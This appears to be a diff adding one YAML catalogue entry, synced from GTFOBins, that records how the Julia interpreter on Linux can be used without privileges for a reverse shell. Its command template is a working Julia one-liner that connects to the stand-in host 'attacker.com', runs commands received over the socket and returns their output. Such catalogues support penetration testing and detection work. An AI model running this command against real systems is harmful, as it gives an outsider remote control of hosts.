@@ -1,0 +1,26 @@
+id: gtfobins/julia/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: julia
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd
+    = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`,
+    stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+references:
+- https://gtfobins.github.io/gtfobins/julia/
+tags:
+- linux
+- unix
+- gtfobins
